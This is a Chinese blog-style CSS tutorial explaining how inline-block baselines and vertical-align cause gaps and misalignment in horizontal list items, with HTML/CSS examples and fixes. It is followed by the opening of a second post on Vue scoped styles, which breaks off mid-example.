<h3 id="常见现象"><a href="#常见现象" class="headerlink" title="常见现象"></a>常见现象</h3><p>水平排列 li 时，li 下方总有一片空白</p>
<p><img src="../images/css-vertical-align-1.png" alt="vertical-align-1"></p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>outer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>inner<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>inner<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
  <span class="token comment">&lt;!-- 这里本应该直接使用文字"xxx"来说明基线关系（直接使用文字是匿名line-box），但是为了能够直观看到"xxx"的背景色，这里用inline-block的span来代替匿名的line-box --></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>x<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>xxx<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">
  <span class="token selector">.outer</span> <span class="token punctuation">&#123;</span>
    <span class="token property">background-color</span><span class="token punctuation">:</span> yellow<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token selector">.inner</span> <span class="token punctuation">&#123;</span>
    <span class="token property">background-color</span><span class="token punctuation">:</span> gray<span class="token punctuation">;</span>
    <span class="token property">display</span><span class="token punctuation">:</span> inline-block<span class="token punctuation">;</span>
    <span class="token comment">/* 用较大的宽高撑开父级元素，可以看出父元素baseline随子元素的改变 */</span>
    <span class="token property">width</span><span class="token punctuation">:</span> 50px<span class="token punctuation">;</span>
    <span class="token property">height</span><span class="token punctuation">:</span> 50px<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token selector">.x</span> <span class="token punctuation">&#123;</span>
    <span class="token property">background-color</span><span class="token punctuation">:</span> white<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="形成原因"><a href="#形成原因" class="headerlink" title="形成原因"></a>形成原因</h4><ol>
<li><p>li 元素为 inline-block 元素，根据 inline-block 元素基线判断原则，li 内无内容、overflow 属性不为 visible，所以 li 的基线位置为底部</p>
</li>
<li><p>li 元素较大，撑开了 ul 元素，根据 vertical-align 默认值 baseline，li 基线与父级 ul 基线对齐，则 ul 元素基线位置被迫下移与 li 平齐</p>
</li>
<li><p>ul 中文字为匿名 line-box，有默认的行高，文字基线到底线的距离，形成了 li 下方的空白区域</p>
</li>
</ol>
<h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><p>理解了这种情况的形成原因，我们就知道了如何解决这种情况，两种方法：一种是将基线上移，另一种是将行高减小</p>
<ol>
<li><p>基线上移：li 元素 vertical-align 设为非 bottom 的值；</p>
</li>
<li><p>行高缩小：ul 元素 line-height 设为 0，或 font-size 设为 0；</p>
</li>
</ol>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token comment">/* 方法1 */</span>
<span class="token selector">.inner</span> <span class="token punctuation">&#123;</span>
  <span class="token property">vertical-align</span><span class="token punctuation">:</span> middle<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">/* 方法2 */</span>
<span class="token selector">.outer</span> <span class="token punctuation">&#123;</span>
  <span class="token property">line-height</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>
  <span class="token comment">/* 或 */</span>
  <span class="token property">font-size</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>缩小行高的方法不推荐使用，因为在父级中设置会影响子元素。</p>
<p>特别提醒，其实还可以用 inline-flex 来彻底解决这个问题。</p>
<h3 id="问题延伸-1"><a href="#问题延伸-1" class="headerlink" title="问题延伸 1"></a>问题延伸 1</h3><p>当 ul 高度与行高相等时，li 设置 vertical-align 为 middle，为什么 li 不是完全垂直居中的？</p>
<p><img src="../images/css-vertical-align-2.png" alt="vertical-align-2"></p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>outer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>inner<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>inner<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>x<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>xxx<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">
  <span class="token selector">.outer</span> <span class="token punctuation">&#123;</span>
    <span class="token property">background-color</span><span class="token punctuation">:</span> yellow<span class="token punctuation">;</span>
    <span class="token property">height</span><span class="token punctuation">:</span> 60px<span class="token punctuation">;</span>
    <span class="token property">line-height</span><span class="token punctuation">:</span> 60px<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token selector">.inner</span> <span class="token punctuation">&#123;</span>
    <span class="token property">background-color</span><span class="token punctuation">:</span> gray<span class="token punctuation">;</span>
    <span class="token property">display</span><span class="token punctuation">:</span> inline-block<span class="token punctuation">;</span>
    <span class="token property">width</span><span class="token punctuation">:</span> 50px<span class="token punctuation">;</span>
    <span class="token property">height</span><span class="token punctuation">:</span> 50px<span class="token punctuation">;</span>
    <span class="token property">vertical-align</span><span class="token punctuation">:</span> middle<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token selector">.x</span> <span class="token punctuation">&#123;</span>
    <span class="token property">background-color</span><span class="token punctuation">:</span> white<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="形成原因-1"><a href="#形成原因-1" class="headerlink" title="形成原因"></a>形成原因</h4><ol>
<li><p>当行高与高度相同时，文字会居中，父元素基线位置在居中的文字底部</p>
</li>
<li><p>li 的 vertical-align 设置为 middle 时，li 的中点位置并不是直接与父元素 ul 的中点位置对齐的，而是相对于 ul 基线位置再加半个 x 的高度位置对齐的（通常这个位置略低于中点位置），因此就会发生不是完全居中对齐的情况</p>
</li>
</ol>
<h4 id="解决方法-1"><a href="#解决方法-1" class="headerlink" title="解决方法"></a>解决方法</h4><ol>
<li><p>设置父元素 font-size 为 0，由于不存在文字高度了，使得父元素基线与中点位置重合了，子元素中点对齐父元素基线+半 x 高度时，半 x 高度也为 0，则子元素直接对齐父元素基线，就达到了完全居中的效果。但是我们并不推荐此方法，会导致子元素中的字都消失</p>
</li>
<li><p>使用辅助兄弟元素。先取消父元素的 line-height 设置，以使父元素基线位置不被固定，再设置一个宽为 0，高 100%的兄弟元素，并设置 display 为 inline-block，vertical-align 设为 middle，即可将父元素的基线位置变至辅助元素的中点，这样要居中的子元素设置 vertical-align 为 middle 后就可以正确垂直居中了</p>
</li>
</ol>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>outer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>inner<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>inner<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>helper<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>x<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>xxx<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">
  <span class="token selector">.outer</span> <span class="token punctuation">&#123;</span>
    <span class="token property">background-color</span><span class="token punctuation">:</span> yellow<span class="token punctuation">;</span>
    <span class="token property">height</span><span class="token punctuation">:</span> 60px<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token selector">.inner</span> <span class="token punctuation">&#123;</span>
    <span class="token property">background-color</span><span class="token punctuation">:</span> gray<span class="token punctuation">;</span>
    <span class="token property">display</span><span class="token punctuation">:</span> inline-block<span class="token punctuation">;</span>
    <span class="token property">width</span><span class="token punctuation">:</span> 50px<span class="token punctuation">;</span>
    <span class="token property">height</span><span class="token punctuation">:</span> 50px<span class="token punctuation">;</span>
    <span class="token property">vertical-align</span><span class="token punctuation">:</span> middle<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token selector">.helper</span> <span class="token punctuation">&#123;</span>
    <span class="token property">display</span><span class="token punctuation">:</span> inline-block<span class="token punctuation">;</span>
    <span class="token property">height</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>
    <span class="token property">vertical-align</span><span class="token punctuation">:</span> middle<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token selector">.x</span> <span class="token punctuation">&#123;</span>
    <span class="token property">background-color</span><span class="token punctuation">:</span> white<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="问题延伸-2"><a href="#问题延伸-2" class="headerlink" title="问题延伸 2"></a>问题延伸 2</h3><p>li 中有文字时</p>
<p><img src="../images/css-vertical-align-3.png" alt="vertical-align-3"></p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>outer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>inner<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>inner<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>x<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>x<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>xxx<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">
  <span class="token selector">.outer</span> <span class="token punctuation">&#123;</span>
    <span class="token property">background-color</span><span class="token punctuation">:</span> yellow<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token selector">.inner</span> <span class="token punctuation">&#123;</span>
    <span class="token property">background-color</span><span class="token punctuation">:</span> gray<span class="token punctuation">;</span>
    <span class="token property">display</span><span class="token punctuation">:</span> inline-block<span class="token punctuation">;</span>
    <span class="token property">width</span><span class="token punctuation">:</span> 50px<span class="token punctuation">;</span>
    <span class="token property">height</span><span class="token punctuation">:</span> 50px<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token selector">.x</span> <span class="token punctuation">&#123;</span>
    <span class="token property">background-color</span><span class="token punctuation">:</span> white<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="形成原因-2"><a href="#形成原因-2" class="headerlink" title="形成原因"></a>形成原因</h4><ol>
<li><p>li 元素为 inline-block 元素，根据 inline-block 元素基线判断原则，第二个 li 有内容，所以 li 的基线位置为最后一个 line-box 的基线，x 字母为一个匿名 line-box，它的基线为 x 的底部，该 li 元素有且只有一个 line-box 字母 x，所以第二个 li 元素基线位置就是字母 x 的基线位置</p>
</li>
<li><p>第一个 li 元素基线仍为底部，第二个 li 元素基线为其中字母 x 基线，它们都与父元素 ul 基线对齐，那么两个 li 元素基线也是对齐的，则第二个 li 元素下移，将父元素 ul 撑得更大</p>
</li>
</ol>
<h4 id="解决方法-2"><a href="#解决方法-2" class="headerlink" title="解决方法"></a>解决方法</h4><ol>
<li><p>改变 li 元素对齐方式，不再与父元素基线对齐</p>
</li>
<li><p>为第二个 li 元素增加 overflow 不为 visible 的值</p>
</li>
</ol>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token comment">&lt;!-- 方法二 --></span>
<span class="token comment">&lt;!-- 增加overflow属性后li基线位置重新变为li底部 --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>inner<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">overflow</span><span class="token punctuation">:</span> auto</span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>x<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">
  <span class="token comment">/* 方法一 */</span>
  <span class="token selector">.inner</span> <span class="token punctuation">&#123;</span>
    <span class="token property">vertical-align</span><span class="token punctuation">:</span> middle<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="问题延伸-3"><a href="#问题延伸-3" class="headerlink" title="问题延伸 3"></a>问题延伸 3</h3><p>父元素 font-size 为 0 时，一个 li 中为空，一个 li 中有字符，为什么第二个 li 上边界与第一个 li 下边界对齐？</p>
<p><img src="../images/css-vertical-align-4.png" alt="vertical-align-4"></p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>outer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>inner<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>inner<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>x<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">
  <span class="token selector">.outer</span> <span class="token punctuation">&#123;</span>
    <span class="token property">background-color</span><span class="token punctuation">:</span> yellow<span class="token punctuation">;</span>
    <span class="token property">font-size</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token selector">.inner</span> <span class="token punctuation">&#123;</span>
    <span class="token property">background-color</span><span class="token punctuation">:</span> gray<span class="token punctuation">;</span>
    <span class="token property">display</span><span class="token punctuation">:</span> inline-block<span class="token punctuation">;</span>
    <span class="token property">width</span><span class="token punctuation">:</span> 50px<span class="token punctuation">;</span>
    <span class="token property">height</span><span class="token punctuation">:</span> 50px<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="形成原因-3"><a href="#形成原因-3" class="headerlink" title="形成原因"></a>形成原因</h4><ol>
<li><p>根据 inline-block 基线原则，第一个 li 内无内容且 overflow 不为 visible，其基线位置为 li 底边界，第二个 li 内有内容，其基线位置为字母 x 基线，第一个 li 底边与第二个 li 中字母 x 基线对齐</p>
</li>
<li><p>当 font-size 为 0 时，字符高度为 0，字母 x 基线位置与第二个 li 顶边界重合，就造成了第一个 li 底边界与第二个 li 顶边界对齐的情况</p>
</li>
</ol>
<h3 id="问题延伸-4"><a href="#问题延伸-4" class="headerlink" title="问题延伸 4"></a>问题延伸 4</h3><p>父元素 line-height 为 0 时，一个 li 中为空，一个 li 中有字符，为什么第二个 li 背景下移了？</p>
<p><img src="../images/css-vertical-align-5.png" alt="vertical-align-5"></p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>outer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>inner<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>inner<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>x<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">
  <span class="token selector">.outer</span> <span class="token punctuation">&#123;</span>
    <span class="token property">background-color</span><span class="token punctuation">:</span> yellow<span class="token punctuation">;</span>
    <span class="token property">line-height</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token selector">.inner</span> <span class="token punctuation">&#123;</span>
    <span class="token property">background-color</span><span class="token punctuation">:</span> gray<span class="token punctuation">;</span>
    <span class="token property">display</span><span class="token punctuation">:</span> inline-block<span class="token punctuation">;</span>
    <span class="token property">width</span><span class="token punctuation">:</span> 50px<span class="token punctuation">;</span>
    <span class="token property">height</span><span class="token punctuation">:</span> 50px<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="形成原因-4"><a href="#形成原因-4" class="headerlink" title="形成原因"></a>形成原因</h4><ol>
<li><p>两个 li 的基线情况同上例中一样，第一个 li 底边界为基线，第二个 li 字母 x 基线为 li 基线。</p>
</li>
<li><p>字符占据高度由行高决定，li 继承了父元素行高为 0，那么字符占据高度也为 0，此时 li 的上边界就处于字符内容区域的顶部，降低到了字符内容区域的垂直中点上，这就造成了第二个 li 背景下移了。（注意这里不是 font-size 为 0，虽然字符占据高度为 0 了，但字符还是可见的，字符内容区域 content area 高度没有改变，若 font-size 为 0 字符就不可见了，内容区域高度也为 0 了）</p>
</li>
</ol>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li><p>元素基线位置是由元素自身的字体大小与行高决定的，还会受到子元素影响</p>
</li>
<li><p>inline-block 元素在有正常文档流内容或 overflow 属性计算值为 visible 以外的值的情况下，baseline 就是最后一个 line-box 元素的 baseline，否则 baseline 是 margin-box 的下边界（line-box、margin-box 是 css 各种盒模型的术语）</p>
</li>
<li><p>vertical-align 值为 middle 时，当前 box 的中点位置并不是直接与父级 box 的中点位置对齐的，而是相对于父级 box 的(基线位置 + (x 高度 / 2)) 位置对齐的（通常这个位置略低于中点位置）</p>
</li>
<li><p>font-size 为 0 时，字符内容区域高度为 0，字符占据高度为 0，由于 x 高度为 0，vertical-align: middle 直接对齐父级 box 基线；line-height 为 0 时，字符内容区域高度不变，字符占据高度为 0，当前 box 上边界由字符内容区域上边界下移至字符内容区域垂直中点</p>
</li>
</ol>
<blockquote>
<p>参考链接<br><a href="https://zhuanlan.zhihu.com/p/52441893">你可能不知道的 vertical-align</a><br><a href="https://drafts.csswg.org/css2/visudet.html#propdef-vertical-align">W3C Draft</a><br><a href="https://www.zhangxinxu.com/wordpress/2015/08/css-deep-understand-vertical-align-and-line-height/comment-page-1/">CSS 深入理解 vertical-align 和 line-height 的基友关系</a><br><a href="https://christopheraue.net/design/vertical-align">Vertical-Align: All You Need To Know (CSS)</a></p>
</blockquote>
]]></content>
      <categories>
        <category>css</category>
      </categories>
      <tags>
        <tag>inline</tag>
        <tag>vertical-align</tag>
      </tags>
  </entry>
  <entry>
    <title>css在vue组件中使用scoped属性无法修改另一个组件的全局样式</title>
    <url>/2019/06/01/css%E5%9C%A8vue%E4%B8%AD%E4%BD%BF%E7%94%A8scoped%E5%B1%9E%E6%80%A7%E6%97%A0%E6%B3%95%E4%BF%AE%E6%94%B9%E5%85%A8%E5%B1%80%E6%A0%B7%E5%BC%8F/</url>
    <content><![CDATA[<p>我们在 vue 的使用过程中常常会遇到这样的问题，想要在局部的 vue 文件中修改一个组件中的全局样式，且不影响全局，只在当前的 vue 文件中生效。我们直觉上就是通过 style 标签上 scoped 属性来实现局部生效，不影响全局。但是事实上这样做并没有效果，局部的样式并没有生效，这是为什么呢？</p>
<p>让我们用一个例子来说明问题，假设我们在当前组件 A 中使用的另一个组件 B，组件 B 中使用了一个全局的样式：字为红色。我们想让 B 组件在 A 组件中使用时字为蓝色，而在其他地方使用时字依然是红色。我们在 A 组件中给 style 标签设置了 scoped 属性，然后设置.foo 的类为蓝色，结果并未生效。</p>
<span id="more"></span>

<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token comment">&lt;!-- component B --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>B<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>foo<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>这里字为红色<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
  <span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">&#123;</span>
    name<span class="token operator">:</span> <span class="token string">"B"</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
